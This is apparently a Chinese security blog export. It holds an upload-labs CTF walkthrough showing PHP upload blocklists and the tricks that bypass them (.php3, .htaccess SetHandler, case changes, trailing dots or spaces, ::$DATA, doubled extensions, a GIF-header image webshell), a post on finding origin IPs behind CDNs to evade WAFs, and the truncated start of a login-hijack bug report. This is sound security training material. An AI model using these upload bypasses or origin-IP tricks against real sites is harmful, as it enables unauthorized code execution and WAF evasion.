<p>这关的代码比较长，我就直接贴出来了~</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line">$msg = <span class="keyword">null</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">'.asp'</span>,<span class="string">'.aspx'</span>,<span class="string">'.php'</span>,<span class="string">'.jsp'</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span></pre></td></tr><tr><td class="code"><pre><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>); <span class="comment">// 获取文件名的后缀（就是获取.后面的内容）</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        $file_ext = trim($file_ext); <span class="comment">//收尾去空</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="keyword">if</span>(!in_array($file_ext, $deny_ext)) &#123; <span class="comment">// 如果$file_ext的值不在$deny_ext列表里，即进入条件</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span></pre></td></tr><tr><td class="code"><pre><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;          </span></pre></td></tr><tr><td class="code"><pre><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file,$img_path)) &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">                 $is_upload = <span class="keyword">true</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line">            &#125; <span class="keyword">else</span> &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line">            &#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        &#125; <span class="keyword">else</span> &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">            $msg = <span class="string">'不允许上传.asp,.aspx,.php,.jsp后缀文件！'</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        &#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    &#125; <span class="keyword">else</span> &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure>

<p>既然不能上传<code>php</code>，那么我们可以上传<code>.php3</code>（在某些环境下<code>php3</code>也是当<code>php</code>解析，介绍文章：<code>https://www.cnblogs.com/natian-ws/p/7265806.html</code>）</p>
<p><img src="http://static.zybuluo.com/1kbfree/gklph1wdj0vfabm9i2z7w1ba/1.png" alt="1.png-135.2kB"></p>
<p>然后看看是否上传了</p>
<p><img src="http://static.zybuluo.com/1kbfree/f9jc8iu3bedg49usjc4tipvg/1.png" alt="1.png-25.3kB"></p>
<p>可以看到是上传了的，但是为什么名字会那么长呢？<br>可以看看代码中第<code>15</code>行</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</span></pre></td></tr></table></figure>

<p>这个<code>$img_path</code>就是上传后的文件的地址，<code>UPDATE_PATH</code>就是上传目录(<code>upload</code>)，<code>data(&quot;YmdHis&quot;)</code>就是当前时间的年月日时分秒，<code>rand(1000,9999)</code>就是在<code>0000</code>到<code>9999</code>中随机抽数字，<code>$file_ext</code>就是上传的文件的后缀，所以拼接起来就是这么长的名字。</p>
<p>那么我们上传了这个文件后，看不到他的名字，我们就可以爆破当前时间的年月日时分秒，然后后面几个随机数字爆破，这里不演示了，直接打开看看<code>php3</code>是否和<code>php</code>效果一样~</p>
<h3 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h3><p>这一关坏得很，因为他把全部后缀都加入黑名单了，代码如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line">$msg = <span class="keyword">null</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">"php1"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">"pHp1"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span></pre></td></tr><tr><td class="code"><pre><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        $file_ext = trim($file_ext); <span class="comment">//收尾去空</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span></pre></td></tr><tr><td class="code"><pre><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</span></pre></td></tr><tr><td class="code"><pre><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">                $is_upload = <span class="keyword">true</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line">            &#125; <span class="keyword">else</span> &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line">            &#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        &#125; <span class="keyword">else</span> &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">            $msg = <span class="string">'此文件不允许上传!'</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        &#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    &#125; <span class="keyword">else</span> &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure>

<p>可以看到限制了很多后缀，但是我们可以上传<code>.htaccess</code>文件，然后在里面写</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SetHandler application&#x2F;x-httpd-php</span></pre></td></tr></table></figure>

<p>这个意思是把这个目录的所以文件当<code>php</code>解析，但是这个也是有环境限制的，只能在<code>apache</code>用，因为<code>.htaccess</code>是<code>apache</code>的配置文件</p>
<h3 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h3><p>这一关代码如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line">$msg = <span class="keyword">null</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span></pre></td></tr><tr><td class="code"><pre><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span></pre></td></tr><tr><td class="code"><pre><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</span></pre></td></tr><tr><td class="code"><pre><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">                $is_upload = <span class="keyword">true</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line">            &#125; <span class="keyword">else</span> &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line">            &#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        &#125; <span class="keyword">else</span> &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">            $msg = <span class="string">'此文件类型不允许上传！'</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        &#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    &#125; <span class="keyword">else</span> &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure>

<p>这一段大概意思就是上传的文件后缀名不允许出现在<code>$deny_ext</code>里，但是我们可以通过上传<code>Php</code>来绕过~ 他这里限制了<code>php</code>不能上传 但是并没有将其全转换成小写 所以可以用大写绕过</p>
<p><img src="http://static.zybuluo.com/1kbfree/kgpcz0hxj09dh57r08zc8ned/1.png" alt="1.png-241.9kB"></p>
<h3 id="第六关"><a href="#第六关" class="headerlink" title="第六关"></a>第六关</h3><p><img src="http://static.zybuluo.com/1kbfree/gcfd56ax6iap0olkmal7zes5/1.png" alt="1.png-60.1kB"></p>
<p>这一关也是黑名单策略，然后把<code>.htaccess</code>文件也限制了，但是我们可以用<code>php空格</code>绕过，如下</p>
<p><img src="http://static.zybuluo.com/1kbfree/zcos4m1rgbmdwjo3jd64sexb/1.png" alt="1.png-211.2kB"></p>
<h3 id="第七关"><a href="#第七关" class="headerlink" title="第七关"></a>第七关</h3><p><img src="http://static.zybuluo.com/1kbfree/zf12ie3hs0k5aa3neqe0xp47/1.png" alt="1.png-104.4kB"></p>
<p>这一关还是黑名单策略，因为这里没有把<code>.</code>删除，所以可以上传<code>.php.</code>绕过（原理是<code>window</code>会把文件后缀后面的<code>.</code>删除，比如上传<code>1.php....</code>会变成<code>1.php</code>这是<code>window</code>的特性）</p>
<p><img src="http://static.zybuluo.com/1kbfree/7i9btw4p1jgg389i5ldg8f7n/1.png" alt="1.png-195.2kB"></p>
<h3 id="第八关"><a href="#第八关" class="headerlink" title="第八关"></a>第八关</h3><p><img src="http://static.zybuluo.com/1kbfree/e235k0xqmjlb1mux16sq42pp/1.png" alt="1.png-104.8kB"></p>
<p>还是黑名单，但是我们还是可以利用<code>window</code>的特性绕过，上传一个<code>.php::$DATA</code>后缀类型，上传后会变成<code>.php</code></p>
<p><img src="http://static.zybuluo.com/1kbfree/oggqh8pqlrxh123ach0i1sr5/1.png" alt="1.png-182.3kB"></p>
<h3 id="第九关"><a href="#第九关" class="headerlink" title="第九关"></a>第九关</h3><p><img src="http://static.zybuluo.com/1kbfree/sm2pqysgey461fw4horiamzt/1.png" alt="1.png-61.3kB"></p>
<p>还是黑名单策略，但是我们可以利用<code>only_free.php. .</code>来绕过，因为第<code>7</code>行会删除末尾的点就变成了<code>only_free.php.空格</code>，然后第<code>11</code>行会把后面的空格去掉，就变成了<code>only_free.php.</code>然后经过<code>window</code>的特性，会变成<code>only_free.php</code>，如图</p>
<p><img src="http://static.zybuluo.com/1kbfree/vv8dn5cbhb5dytjligzy2ay8/1.png" alt="1.png-178.7kB"></p>
<h3 id="第十关"><a href="#第十关" class="headerlink" title="第十关"></a>第十关</h3><p><img src="http://static.zybuluo.com/1kbfree/bp51xt04y8tkd2vcq60e5qxn/1.png" alt="1.png-39.4kB"></p>
<p>先看到第<code>8</code>行，代码意思是：把<code>$file_name</code>中的<code>$deny_ext</code>替换为空，意思就是如果我上传的文件名是<code>1.php</code>而<code>php</code>在<code>$deny_ext</code>列表里，然后就会把<code>php</code>替换为空，变成<code>1.</code>，但是这里有个逻辑缺陷。如上传一个<code>1.pphphp</code>他会把<code>php</code>去掉，如图<img src="http://static.zybuluo.com/1kbfree/1htnv3q748vlkus1ofrqr5tw/1.png" alt="1.png-0.7kB">，然后就变成了<code>1.php</code>成功绕过，如图</p>
<p><img src="http://static.zybuluo.com/1kbfree/n6tnwg5w5j1mxdnxig7loc5a/1.png" alt="1.png-212.5kB"></p>
<h3 id="第十一关"><a href="#第十一关" class="headerlink" title="第十一关"></a>第十一关</h3><p>暂空</p>
<h3 id="第十二关"><a href="#第十二关" class="headerlink" title="第十二关"></a>第十二关</h3><p>暂空</p>
<h3 id="第十三关"><a href="#第十三关" class="headerlink" title="第十三关"></a>第十三关</h3><p>这一关比较奇特，不用上传<code>php</code>文件，只要能成功上传图片即可，而上传图片的前提是这个图片必须为图片马，何为图片马呢？ 就是一个能正常显示，但是图片本身是带有恶意的代码的，详细可看如下链接</p>
<p><a href="http://gv7.me/articles/2017/picture-trojan-horse-making-method/" target="_blank" rel="noopener">http://gv7.me/articles/2017/picture-trojan-horse-making-method/</a></p>
<p>这里上传的话上传一个<code>only_free.jpg</code>，然后内容是</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GIF98a</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">phpinfo();</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="meta">?&gt;</span></span></pre></td></tr></table></figure>

<p><code>GIF98a</code>是图片头，这样子表示这个是<code>GIF</code>图片，然后看上传结果</p>
<p><img src="http://static.zybuluo.com/1kbfree/cs7e2iz253rsgfsrebhvl41s/1.png" alt="1.png-200.4kB"></p>
<h3 id="第十四关"><a href="#第十四关" class="headerlink" title="第十四关"></a>第十四关</h3><p><img src="http://static.zybuluo.com/1kbfree/1fotl28nmsl9pdtp7yycrhis/1.png" alt="1.png-102.3kB"></p>
<p>看到这里的第四行是获取<code>$filename</code>的图片类型，依旧可以用<code>GIF98a</code>来绕过</p>
<p><img src="http://static.zybuluo.com/1kbfree/uys1zulksuzq9g39yhj7jjae/1.png" alt="1.png-216.4kB"></p>
<h3 id=""><a href="#" class="headerlink" title=""></a></h3>]]></content>
      <categories>
        <category>兴趣爱好</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>获取真实IP方法【绕过CDN】</title>
    <url>/2018/12/18/%E8%8E%B7%E5%8F%96%E7%9C%9F%E5%AE%9EIP%E6%96%B9%E6%B3%95%E3%80%90%E7%BB%95%E8%BF%87CDN%E3%80%91/</url>
    <content><![CDATA[<blockquote>
<p>现在很多网站都有<code>CDN</code>（CDN的全称是Content Delivery Network，即内容分发网络。其基本思路是尽可能避开互联网上有可能影响数据传输速度和稳定性的瓶颈和环节，使内容传输的更快、更稳定。通过在网络各处放置节点服务器所构成的在现有的互联网基础之上的一层智能虚拟网络，CDN系统能够实时地根据网络流量和各节点的连接、负载状况以及到用户的距离和响应时间等综合信息将用户的请求重新导向离用户最近的服务节点上。其目的是使用户可就近取得所需内容，解决 Internet网络拥挤的状况，提高用户访问网站的响应速度）。</p>
</blockquote>
<blockquote>
<p>所以有<code>CDN</code>我们就无法直接看到目标网站的真实<code>IP</code>~</p>
</blockquote>
<h3 id="为什么要知道真实IP"><a href="#为什么要知道真实IP" class="headerlink" title="为什么要知道真实IP"></a>为什么要知道真实IP</h3><p>在渗透中，很多恶意请求都会被<code>CDN</code>拦截掉，这个叫云<code>WAF</code>，那么我们可以直接去请求他的真实<code>IP</code>，而不经过他的<code>CDN</code>处理，就可以直接目标服务器的<code>WAF</code></p>
<h3 id="多PING验证是否开启了CDN"><a href="#多PING验证是否开启了CDN" class="headerlink" title="多PING验证是否开启了CDN"></a>多<code>PING</code>验证是否开启了<code>CDN</code></h3><p>有很多种办法，比如多地点<code>PING</code>测试，因为目标地址如果开启了<code>CDN</code>的话那么每个地方去<code>PING</code>的地址都会不同（<code>CDN</code>就是加快网站访问速度，所以每个地点都会有<code>CDN</code>的节点，所以每个地点的<code>CDN</code>服务器不同，<code>ip</code>也就不同）</p>
<p>多<code>ping</code>测试网站：<br><a href="http://tool.chinaz.com/speedtest/" target="_blank" rel="noopener">http://tool.chinaz.com/speedtest/</a></p>
<p><img src="http://static.zybuluo.com/1kbfree/e8s3hsg7tyenst7w9p4hd0gx/1.png" alt="1.png-233.1kB"></p>
<p>还有这二个</p>
<p><a href="http://ping.aizhan.com/" target="_blank" rel="noopener">http://ping.aizhan.com/</a><br><a href="http://ce.cloud.360.cn/" target="_blank" rel="noopener">http://ce.cloud.360.cn/</a></p>
<h3 id="利用第三方工具检测是否是使用CDN"><a href="#利用第三方工具检测是否是使用CDN" class="headerlink" title="利用第三方工具检测是否是使用CDN"></a>利用第三方工具检测是否是使用CDN</h3><p><a href="https://www.ipip.net/ip.html" target="_blank" rel="noopener">https://www.ipip.net/ip.html</a></p>
<hr>
<h3 id="对比开放的WAF-IP"><a href="#对比开放的WAF-IP" class="headerlink" title="对比开放的WAF IP"></a>对比开放的<code>WAF IP</code></h3><p>开放的<code>WAF IP</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">103.21.244.0&#x2F;22</span></pre></td></tr><tr><td class="code"><pre><span class="line">103.22.200.0&#x2F;22</span></pre></td></tr><tr><td class="code"><pre><span class="line">103.31.4.0&#x2F;22</span></pre></td></tr><tr><td class="code"><pre><span class="line">104.16.0.0&#x2F;12</span></pre></td></tr><tr><td class="code"><pre><span class="line">108.162.192.0&#x2F;18</span></pre></td></tr><tr><td class="code"><pre><span class="line">131.0.72.0&#x2F;22</span></pre></td></tr><tr><td class="code"><pre><span class="line">141.101.64.0&#x2F;18</span></pre></td></tr><tr><td class="code"><pre><span class="line">162.158.0.0&#x2F;15</span></pre></td></tr><tr><td class="code"><pre><span class="line">172.64.0.0&#x2F;13</span></pre></td></tr><tr><td class="code"><pre><span class="line">173.245.48.0&#x2F;20</span></pre></td></tr><tr><td class="code"><pre><span class="line">188.114.96.0&#x2F;20</span></pre></td></tr><tr><td class="code"><pre><span class="line">190.93.240.0&#x2F;20</span></pre></td></tr><tr><td class="code"><pre><span class="line">197.234.240.0&#x2F;22</span></pre></td></tr><tr><td class="code"><pre><span class="line">198.41.128.0&#x2F;17</span></pre></td></tr><tr><td class="code"><pre><span class="line">199.83.128.0&#x2F;21</span></pre></td></tr><tr><td class="code"><pre><span class="line">198.143.32.0&#x2F;19</span></pre></td></tr><tr><td class="code"><pre><span class="line">149.126.72.0&#x2F;21</span></pre></td></tr><tr><td class="code"><pre><span class="line">103.28.248.0&#x2F;22</span></pre></td></tr><tr><td class="code"><pre><span class="line">45.64.64.0&#x2F;22</span></pre></td></tr><tr><td class="code"><pre><span class="line">185.11.124.0&#x2F;22</span></pre></td></tr><tr><td class="code"><pre><span class="line">192.230.64.0&#x2F;18</span></pre></td></tr><tr><td class="code"><pre><span class="line">107.154.0.0&#x2F;16</span></pre></td></tr><tr><td class="code"><pre><span class="line">45.60.0.0&#x2F;16</span></pre></td></tr><tr><td class="code"><pre><span class="line">45.223.0.0&#x2F;16</span></pre></td></tr></table></figure>

<p>然后用<code>nslookup 域名</code>来查询解析的<code>IP</code>，然后去对比开放的<code>WAF IP</code>，如果在里面的话就忽略掉</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nslookup xxx.xxx.com</span></pre></td></tr></table></figure>

<p><code>nslookup</code>用法 <a href="https://blog.csdn.net/violet_echo_0908/article/details/52033725" target="_blank" rel="noopener">https://blog.csdn.net/violet_echo_0908/article/details/52033725</a></p>
<p>还有验证是否有<code>CDN</code>也可以用<code>nslookup</code>，也就是解析的<code>ip</code>都不同</p>
<h3 id="利用漏洞知道真实IP"><a href="#利用漏洞知道真实IP" class="headerlink" title="利用漏洞知道真实IP"></a>利用漏洞知道真实<code>IP</code></h3><p>如<code>SSRF</code>漏洞，可直接探测到目标服务器的内网，还有比如有些站泄露了<code>phpinfo</code>那么也可以看到真实的<code>ip</code>地址，还有一些就是社工站长这些了~</p>
<h3 id="看子域名的解析IP"><a href="#看子域名的解析IP" class="headerlink" title="看子域名的解析IP"></a>看子域名的解析<code>IP</code></h3><p>很多站长都只会在主站上挂<code>CDN</code>，导致我们可以去看子域名的<code>ip</code>（大部分原因都是因为<code>CDN</code>贵，所以只有主站才挂着~）</p>
<h3 id="看历史解析IP"><a href="#看历史解析IP" class="headerlink" title="看历史解析IP"></a>看历史解析IP</h3><p>查询域名历史DNS解析，网上有很多站点都可以查询站点的历史DNS解析，列举如下几个链接</p>
<p><a href="https://viewdns.info/" target="_blank" rel="noopener">https://viewdns.info/</a><br><a href="http://site.ip138.com/" target="_blank" rel="noopener">http://site.ip138.com/</a><br><a href="https://securitytrails.com/" target="_blank" rel="noopener">https://securitytrails.com/</a></p>
<p>比如对方服务器<code>xx</code>时候没有挂<code>CDN</code>然后那个时候正好有历史<code>ip</code>解析</p>
<h3 id="利用国外服务器查"><a href="#利用国外服务器查" class="headerlink" title="利用国外服务器查"></a>利用国外服务器查</h3><p>很多国内厂商只对国内的路线才有<code>CDN</code>服务器，国外没有，所以用国外的服务器去看的话就直接是目标服务器的真实<code>IP</code></p>
]]></content>
      <categories>
        <category>兴趣爱好</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>某厂因登录处利用GET请求传递的参数而造成可劫持登录凭据</title>
    <url>/2018/12/18/%E6%9F%90%E5%8E%82%E5%9B%A0%E7%99%BB%E5%BD%95%E5%A4%84%E5%88%A9%E7%94%A8GET%E8%AF%B7%E6%B1%82%E4%BC%A0%E9%80%92%E7%9A%84%E5%8F%82%E6%95%B0%E8%80%8C%E9%80%A0%E6%88%90%E5%8F%AF%E5%8A%AB%E6%8C%81%E7%99%BB%E5%BD%95%E5%87%AD%E6%8D%AE/</url>
    <content><![CDATA[<h2 id="漏洞挖于18年，在其他平台发布过，都是原创。"><a href="#漏洞挖于18年，在其他平台发布过，都是原创。" class="headerlink" title="漏洞挖于18年，在其他平台发布过，都是原创。"></a>漏洞挖于18年，在其他平台发布过，都是原创。</h2><p>1、打开url：<a href="http://xxx.xxx.com/contact/portal/pim/index.shtml" target="_blank" rel="noopener">http://xxx.xxx.com/contact/portal/pim/index.shtml</a></p>
<p><img src="http://static.zybuluo.com/1kbfree/xag1ninzr6aev0js0p4fyva6/1.png" alt=""></p>
<p>2、点击登陆，并且抓包，抓取的数据包如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;wauthen&#x2F;login?xx.action&#x3D;uilogin&amp;xx.realm&#x3D;cloud.lps.xxx.com&amp;xx.uinfo&#x3D;username,nickname,pid&amp;xx.lang&#x3D;zh_CN&amp;xx.ctx&#x3D;aHR0cDovL3RvbmdidS5sZW5vdm8uY29tL2NvbnRhY3QvY29udGFjdC9wb3J0YWwvaG9tZS5odG1s&amp;xx.cb&#x3D;https%3A%2F%2Ftongbu.xxx.com%2Fcontact%2Fcontact%2Fportal%2FinitSession&amp;xx.source&#x3D;tongbu.xxx.com&amp;display&#x3D; HTTP&#x2F;1.1</span></pre></td></tr><tr><td class="code"><pre><span class="line">Host: xxx.xxx.xxx</span></pre></td></tr><tr><td class="code"><pre><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 6.3; rv:36.0) Gecko&#x2F;20100101 Firefox&#x2F;36.04</span></pre></td></tr><tr><td class="code"><pre><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span></pre></td></tr><tr><td class="code"><pre><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,en-US;q&#x3D;0.5,en;q&#x3D;0.3</span></pre></td></tr><tr><td class="code"><pre><span class="line">Accept-Encoding: gzip, deflate</span></pre></td></tr><tr><td class="code"><pre><span class="line">DNT: 1</span></pre></td></tr><tr><td class="code"><pre><span class="line">Referer: http:&#x2F;&#x2F;xxxxx.xxx&#x2F;</span></pre></td></tr><tr><td 